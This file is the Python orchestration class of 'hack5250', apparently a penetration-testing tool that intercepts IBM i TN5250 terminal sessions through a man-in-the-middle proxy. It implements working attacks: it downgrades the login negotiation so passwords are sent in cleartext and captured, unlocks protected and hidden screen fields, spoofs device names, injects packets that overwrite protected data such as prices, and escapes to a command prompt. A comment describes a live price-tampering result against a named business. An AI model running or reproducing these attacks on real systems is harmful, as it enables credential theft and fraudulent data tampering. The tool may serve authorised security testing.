"""
hack5250 orchestration: wires ProxyDaemon + TN5250 + Storage + MaskInjector.

Unlike hack3270's libhack3270.py (which has 1700+ lines of legacy compat),
this is clean from the start. The Protocol does the protocol work,
ProxyDaemon does the byte-pumping, this class just connects them.

Lifecycle (driven by GUI/main loop):
    h = Hack5250("10.0.0.50", 23)
    h.start_api()
    h.wait_for_emulator()    # blocks until tn5250 emulator connects
    h.connect_to_host()      # connects upstream to IBM i
    while running:
        h.tick()             # one select() pass
    h.shutdown()
"""
import json
import logging

from hackterm_core import ProxyDaemon, Storage, MaskInjector, ApiServer
from hack5250.tn5250 import TN5250
from hack5250.attacks.escape import build_attn_packet, get_masked_keys


# Default ports — chosen so hack3270 and hack5250 can run side-by-side.
DEFAULT_PROXY_PORT = 5251   # 5250 + 1 (mirrors hack3270's 3270 + 1 = 3271)
DEFAULT_API_PORT = 52500    # hack3270 uses 31337


class Hack5250:
    def __init__(self, server_ip, server_port,
                 proxy_port=DEFAULT_PROXY_PORT, proxy_ip="127.0.0.1",
                 project_name="ibmi_pentest", tls_enabled=False,
                 codepage="cp037", api_port=DEFAULT_API_PORT,
                 loglevel=logging.WARNING):
        self.logger = logging.getLogger("hack5250")
        self.logger.setLevel(loglevel)

        # --- Components ----------------------------------------------
        self.protocol = TN5250(codepage=codepage)
        self.codec = self.protocol.codec
        self.storage = Storage(f"{project_name}.db", server_ip, server_port,
                               proxy_port, tls_enabled)
        self.daemon = ProxyDaemon(
            protocol=self.protocol,
            storage=self.storage,
            listen_addr=(proxy_ip, proxy_port),
            target_addr=(server_ip, server_port),
            use_tls=tls_enabled,
        )
        self.injector = MaskInjector(self.codec, mask_char="*")
        self.api = ApiServer(port=api_port)
        # NOTE: api.start() binds the port. Don't bind in __init__ — tests
        # construct Hack5250 without wanting to grab a real socket. The
        # entry point calls start_api() explicitly.

        # --- State exposed for GUI -----------------------------------
        self.last_screen = None
        # ref, not copy — protocol appends in negotiate_hook, GUI sees live list
        self.captured_creds = self.protocol.captured_creds

        # --- Observer: parse every host->client screen ---------------
        # Always parse so the GUI/API has the latest screen text without
        # having to fish in storage. Cheap: parse() is one linear pass.
        def _on_screen(data, direction):
            if direction == "s2c":
                try:
                    self.last_screen = self.protocol.parse(data)
                except Exception:
                    self.logger.exception("parse failed on s2c traffic")
        self.daemon.add_observer(_on_screen)

        # Phase 3 Quick stream — passive detectors
        from hack5250.attacks.detector import IBMiMessageDetector, STRPCCMDCanary
        self.message_detector = IBMiMessageDetector(self.protocol)
        self.message_detector.attach(self.daemon)
        self.strpccmd_canary = STRPCCMDCanary()
        self.strpccmd_canary.attach(self.daemon)

        # --- Mask-capture intercept ----------------------------------
        # When armed, the next client->server packet is consumed (NOT
        # forwarded) and split by the injector into preamble/mask/postamble.
        # ProxyDaemon._handle_client treats a None return as "drop".
        self._capture_armed = False

        def _intercept(data):
            if self._capture_armed:
                self.injector.capture(data)
                self._capture_armed = False
                return None  # consume — don't forward the template to host
            return data
        self.daemon.set_client_intercept(_intercept)

        self._register_api_handlers()

    # ================================================================
    # Connection lifecycle — GUI calls these
    # ================================================================

    def start_api(self):
        """Bind the API port. Separate from __init__ so tests don't grab sockets."""
        self.api.start()

    def wait_for_emulator(self):
        """Blocking accept() — waits for tn5250 emulator to connect to proxy."""
        self.daemon.wait_for_client()

    def connect_to_host(self):
        """Connect upstream to the IBM i."""
        self.daemon.connect_to_server()

    def tick(self):
        """One non-blocking select() pass for proxy + API. Call repeatedly."""
        self.daemon.tick()
        self.api.tick()

    def shutdown(self):
        self.api.stop()
        self.daemon.close()
        self.storage.close()

    # ================================================================
    # Attack toggles — GUI checkboxes wire to these
    # ================================================================
    # All toggles map to dataclass fields on the daemon's opts objects.
    # The daemon reads these on every _handle_server/_handle_client pass,
    # so changes take effect on the very next packet — no reconnect needed.

    def set_ffw_unprotect(self, on: bool):
        """Clear FFW bypass bit (0x2000) — make protected fields editable."""
        self.daemon.mutate_opts.unprotect = on

    def set_ffw_reveal_hidden(self, on: bool):
        """Rewrite ATTR_NONDISP (0x27) → visible — show hidden text/fields."""
        self.daemon.mutate_opts.reveal_hidden = on

    def set_ffw_remove_numeric(self, on: bool):
        """Zero FFW shift bits — let alpha into numeric-only fields."""
        self.daemon.mutate_opts.remove_numeric = on

    def set_ffw_high_visibility(self, on: bool):
        """Force ATTR_WHITE on revealed fields — easier to spot."""
        self.daemon.mutate_opts.high_visibility = on

    def refresh_screen(self):
        """Re-push the last server screen through mutate() and to the client.

        Call this ONCE after a batch of set_ffw_* calls — NOT after each
        one. Calling it 4× back-to-back (which 232bd8b accidentally did
        by putting it in each setter) sends 4 screens in <1ms. The
        emulator's format-table rebuild gets interrupted by the next
        screen, leaving it in a broken state where input doesn't flow.

        Live symptom (2026-04-08): user clicks ON, can't submit. Clicks
        OFF, the queued input suddenly goes through — because OFF's 4
        resends were unmutated screens that finally let the format table
        settle correctly.
        """
        if self.last_screen is None or not self.last_screen.raw:
            return
        if self.daemon.client is None:
            return
        mutated = self.protocol.mutate(self.last_screen.raw, self.daemon.mutate_opts)
        try:
            self.daemon.inject_to_client(mutated)
        except RuntimeError:
            pass  # client disconnected mid-toggle

    def set_ibmrseed_downgrade(self, on: bool):
        """Strip the IBMRSEED seed during NEW-ENVIRON negotiation.
        Forces the emulator to send the password in cleartext (RFC 2877).
        Captured creds land in self.captured_creds.
        """
        self.daemon.negotiate_opts.force_cleartext = on

    def set_devname_spoof(self, name: str | None):
        """Rewrite the DEVNAME USERVAR during negotiation. None = disabled."""
        self.daemon.negotiate_opts.spoof_device_name = name

    # ================================================================
    # AID / ATTN injection
    # ================================================================

    def send_aid(self, aid_name: str):
        """Synthesize an inbound packet for the named AID key and inject it.

        aid_name: key into TN5250.aid_table ("ENTER", "F3", "ROLLUP", ...).
        Cursor defaults to (1, 1) — Screen doesn't track host-set cursor.
        """
        aid = self.protocol.aid_table[aid_name]
        cursor = (1, 1)
        pkt = self.protocol.build_inbound(aid, cursor, [])
        self.daemon.inject_to_server(pkt)

    def send_field(self, row: int, col: int, text: str, aid_name: str = "ENTER"):
        """Write text into a specific field position and send the AID.

        This is the workhorse for menu-driven pentesting: write the option
        number into the input field, press ENTER. Bypasses the emulator
        entirely — packet goes proxy→host directly.

        For protected-field tampering: just give the (row, col) of a
        protected field. The host may or may not validate.
        """
        from hackterm_core import FieldWrite
        aid = self.protocol.aid_table[aid_name]
        data = self.codec.to_ebcdic(text)
        pkt = self.protocol.build_inbound(
            aid, cursor=(row, col),
            fields=[FieldWrite(row=row, col=col, data=data)],
        )
        self.daemon.inject_to_server(pkt)

    def send_fields(self, fields: list[tuple[int, int, str]],
                    aid_name: str = "ENTER",
                    cursor: tuple[int, int] | None = None) -> bytes:
        """Send MULTIPLE fields in one packet — the full tampering attack.

        fields: list of (row, col, text). Each becomes an SBA + EBCDIC pair.
        cursor: where the cursor sits in the inbound packet. Defaults to
                the first field's position.

        THE ATTACK: include the legit input field AND extra SBA pairs
        pointing at protected positions. If the host's RECEIVE doesn't
        validate SBA addresses against the format table, the protected
        data gets overwritten.

        Live-proven (Mels Cargo, 2026-04-08): single-field tampering on
        a protected price field persisted $0.01129.59 to the database.
        Multi-field lets you order AND tamper item#/price/whatever in
        one shot — the host can't tell which SBA pairs are "legitimate."

        Returns the packet bytes (for inspection/replay).
        """
        from hackterm_core import FieldWrite
        if not fields:
            raise ValueError("send_fields requires at least one field")
        aid = self.protocol.aid_table[aid_name]
        if cursor is None:
            cursor = (fields[0][0], fields[0][1])
        writes = [FieldWrite(row=r, col=c, data=self.codec.to_ebcdic(t))
                  for r, c, t in fields]
        pkt = self.protocol.build_inbound(aid, cursor, writes)
        self.daemon.inject_to_server(pkt)
        return pkt

    def send_raw(self, data: bytes):
        """Send raw bytes directly to the host. Escape hatch for hand-built
        packets the higher-level methods can't express. The bytes go straight
        to daemon.inject_to_server — no validation, no header building."""
        self.daemon.inject_to_server(data)

    def send_attn(self):
        """Send the ATTN key — header flag, not an AID byte.
        Silent Signal escape: ATTN → Operational Assistant → F9 → CL prompt.
        """
        self.daemon.inject_to_server(build_attn_packet())

    def get_masked_keys(self) -> list[str]:
        """Which F-keys did the host claim were INVALID on the current screen?
        Empty before any screen is received.
        """
        if self.last_screen is None:
            return []
        return get_masked_keys(self.last_screen)

    # ================================================================
    # Mask injection
    # ================================================================

    def arm_mask_capture(self):
        """Next emulator-sent packet will be captured as the injection template.
        Operator: type '*****' into the target field, hit Enter, then this
        intercept grabs the packet and consumes it (host never sees it).
        """
        self._capture_armed = True

    def is_mask_ready(self) -> bool:
        return self.injector.is_ready()

    def inject_word(self, word: str, mode: str = "TRUNC"):
        """Substitute `word` into the captured mask slot and send to host.
        mode: TRUNC | SKIP | OVERFLOW (see hackterm_core.inject)
        """
        pkt = self.injector.build(word, mode=mode)
        if pkt is not None:
            self.daemon.inject_to_server(pkt)

    # ================================================================
    # API handlers
    # ================================================================

    def _register_api_handlers(self):
        self.api.register("ping", lambda _: "pong")

        def _get_screen_text(_):
            return self.last_screen.text if self.last_screen else ""
        self.api.register("get_screen_text", _get_screen_text)

        def _send_aid(args):
            self.send_aid(args.strip())
            return "OK"
        self.api.register("send_aid", _send_aid)

        def _get_creds(_):
            return json.dumps(self.captured_creds)
        self.api.register("get_captured_creds", _get_creds)

        def _get_masked(_):
            return json.dumps(self.get_masked_keys())
        self.api.register("get_masked_keys", _get_masked)

        # --- FFW toggles ---
        def _ffw_set(setter):
            def h(args):
                on = args.strip().lower() in ("1", "true", "on", "yes")
                setter(on)
                return "OK"
            return h
        self.api.register("ffw_unprotect", _ffw_set(self.set_ffw_unprotect))
        self.api.register("ffw_reveal_hidden", _ffw_set(self.set_ffw_reveal_hidden))
        self.api.register("ffw_remove_numeric", _ffw_set(self.set_ffw_remove_numeric))
        self.api.register("ffw_high_visibility", _ffw_set(self.set_ffw_high_visibility))

        def _ffw_status(_):
            o = self.daemon.mutate_opts
            return json.dumps({
                "unprotect": o.unprotect, "reveal_hidden": o.reveal_hidden,
                "remove_numeric": o.remove_numeric, "high_visibility": o.high_visibility,
            })
        self.api.register("ffw_status", _ffw_status)

        # --- Negotiation ---
        self.api.register("ibmrseed_downgrade", _ffw_set(self.set_ibmrseed_downgrade))

        def _devname_spoof(args):
            name = args.strip() or None
            self.set_devname_spoof(name)
            return f"OK: {name or 'cleared'}"
        self.api.register("devname_spoof", _devname_spoof)

        def _nego_status(_):
            n = self.daemon.negotiate_opts
            return json.dumps({
                "force_cleartext": n.force_cleartext,
                "spoof_device_name": n.spoof_device_name,
                "stripped_seed": self.protocol._stripped_seed.hex()
                                 if self.protocol._stripped_seed else None,
            })
        self.api.register("nego_status", _nego_status)

        # --- ATTN escape ---
        def _send_attn(_):
            self.send_attn()
            return "OK"
        self.api.register("send_attn", _send_attn)

        # --- Mask injection ---
        def _arm_capture(_):
            self.arm_mask_capture()
            return "OK: armed — type **** in target field"
        self.api.register("mask_arm", _arm_capture)

        def _mask_status(_):
            return json.dumps({
                "ready": self.is_mask_ready(),
                "mask_len": self.injector.mask_len,
                "preamble_len": len(self.injector.preamble),
                "postamble_len": len(self.injector.postamble),
            })
        self.api.register("mask_status", _mask_status)

        def _inject_word(args):
            parts = args.split(None, 1)
            if not parts:
                return "ERROR: usage: inject_word <word> [TRUNC|SKIP|OVERFLOW]"
            word = parts[0]
            mode = parts[1] if len(parts) > 1 else "TRUNC"
            if not self.is_mask_ready():
                return "ERROR: mask not captured — call mask_arm first"
            self.inject_word(word, mode=mode)
            return "OK"
        self.api.register("inject_word", _inject_word)

        # --- Screen state ---
        def _get_fields(_):
            if not self.last_screen:
                return "[]"
            return json.dumps([{
                "row": f.row, "col": f.col, "length": f.length,
                "protected": f.protected, "hidden": f.hidden, "numeric": f.numeric,
            } for f in self.last_screen.fields])
        self.api.register("get_fields", _get_fields)

        def _get_pf_mask(_):
            if not self.last_screen:
                return "null"
            mask = getattr(self.last_screen, "pf_mask", 0xFFFFFF)
            return json.dumps({"mask": f"0x{mask:06X}", "masked_keys": self.get_masked_keys()})
        self.api.register("get_pf_mask", _get_pf_mask)

        # --- Logs ---
        def _log_count(_):
            return str(len(self.storage.all_logs()))
        self.api.register("log_count", _log_count)

        def _list_aids(_):
            return json.dumps(sorted(self.protocol.aid_table.keys()))
        self.api.register("list_aids", _list_aids)

        # --- D3/D4/E2/E3: Phase 3 Quick stream ---
        def _msg_findings(_):
            return json.dumps(self.message_detector.findings)
        self.api.register("msg_findings", _msg_findings)

        def _strpccmd_alerts(_):
            return json.dumps(self.strpccmd_canary.alerts)
        self.api.register("strpccmd_alerts", _strpccmd_alerts)

        def _get_hidden_content(_):
            from hack5250.attacks.surface import get_hidden_content
            if self.last_screen is None:
                return "[]"
            return json.dumps(get_hidden_content(self.last_screen, self.codec))
        self.api.register("get_hidden_content", _get_hidden_content)

        def _tamper_map(_):
            from hack5250.attacks.surface import tamper_map
            if self.last_screen is None:
                return "[]"
            return json.dumps(tamper_map(self.last_screen, self.codec))
        self.api.register("tamper_map", _tamper_map)

        def _suppress_errors(args):
            on = args.strip().lower() in ("1", "true", "on", "yes")
            self.protocol.suppress_errors = on
            return "OK"
        self.api.register("suppress_errors", _suppress_errors)

        # --- Field write (menu navigation, protected-field tampering) ---
        def _send_field(args):
            # args: "row col text [aid]"
            parts = args.split(None, 3)
            if len(parts) < 3:
                return "ERROR: usage: send_field <row> <col> <text> [aid]"
            try:
                row, col = int(parts[0]), int(parts[1])
            except ValueError:
                return "ERROR: row and col must be integers"
            text = parts[2]
            aid = parts[3] if len(parts) > 3 else "ENTER"
            if aid not in self.protocol.aid_table:
                return f"ERROR: unknown AID {aid!r}"
            self.send_field(row, col, text, aid)
            return "OK"
        self.api.register("send_field", _send_field)

        def _send_fields(args):
            """JSON: {"fields":[[row,col,"text"],...], "aid":"ENTER", "cursor":[r,c]}"""
            try:
                req = json.loads(args)
            except json.JSONDecodeError as e:
                return f"ERROR: bad JSON: {e}"
            fields = req.get("fields")
            if not fields or not isinstance(fields, list):
                return "ERROR: 'fields' must be a non-empty list of [row,col,text]"
            aid = req.get("aid", "ENTER")
            if aid not in self.protocol.aid_table:
                return f"ERROR: unknown AID {aid!r}"
            cursor = tuple(req["cursor"]) if "cursor" in req else None
            try:
                tuples = [(int(r), int(c), str(t)) for r, c, t in fields]
            except (ValueError, TypeError) as e:
                return f"ERROR: each field must be [int,int,str]: {e}"
            pkt = self.send_fields(tuples, aid_name=aid, cursor=cursor)
            return json.dumps({"sent": True, "packet_hex": pkt.hex(),
                               "field_count": len(tuples)})
        self.api.register("send_fields", _send_fields)

        def _send_raw_hex(args):
            """Raw bytes from hex string — escape hatch."""
            hex_str = args.strip().replace(" ", "")
            if not hex_str:
                return "ERROR: usage: send_raw_hex <hex>"
            try:
                data = bytes.fromhex(hex_str)
            except ValueError as e:
                return f"ERROR: bad hex: {e}"
            self.send_raw(data)
            return json.dumps({"sent": True, "bytes": len(data)})
        self.api.register("send_raw_hex", _send_raw_hex)

        # --- Debug: refresh screen (same path as GUI button) ---
        def _refresh(_):
            ls = self.last_screen
            if ls is None:
                return "ERROR: last_screen is None"
            if not ls.raw:
                return f"ERROR: last_screen.raw is empty (len={len(ls.raw)})"
            if self.daemon.client is None:
                return "ERROR: daemon.client is None"
            mutated = self.protocol.mutate(ls.raw, self.daemon.mutate_opts)
            diffs = sum(1 for a, b in zip(ls.raw, mutated) if a != b)
            try:
                self.daemon.inject_to_client(mutated)
            except Exception as e:
                return f"ERROR: inject_to_client raised {e!r}"
            return json.dumps({
                "raw_len": len(ls.raw),
                "mutated_diffs": diffs,
                "fields": len(ls.fields),
                "hidden_fields": sum(1 for f in ls.fields if f.hidden),
                "opts": {
                    "unprotect": self.daemon.mutate_opts.unprotect,
                    "reveal_hidden": self.daemon.mutate_opts.reveal_hidden,
                },
                "injected": True,
            })
        self.api.register("refresh_screen", _refresh)
